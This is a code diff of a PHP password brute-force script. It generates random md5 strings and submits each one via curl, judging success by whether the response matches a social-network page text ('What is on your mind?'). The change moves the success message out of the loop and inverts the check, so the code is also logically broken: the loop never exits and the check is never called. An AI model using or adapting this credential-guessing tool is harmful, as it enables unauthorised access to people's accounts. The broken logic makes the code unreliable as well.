@@ -18,9 +18,10 @@ function bruteForce($Pass)
 while(True)
 {     
 	$Pass = md5(rand(0,100000));
-		echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass."\r\n";
+
 }
 		check_correct($Pass);  
+		echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass."\r\n";
         }
 function check_correct($Pass)
 {
@@ -35,8 +36,8 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "What is on your mind?") {return false;}
-        else {return true;}
+	if($str != "What is on your mind?") {return true;}
+        else {return ;}
 }
 bruteForce($Pass);
 echo "NO PASSWORD FOUND"; 
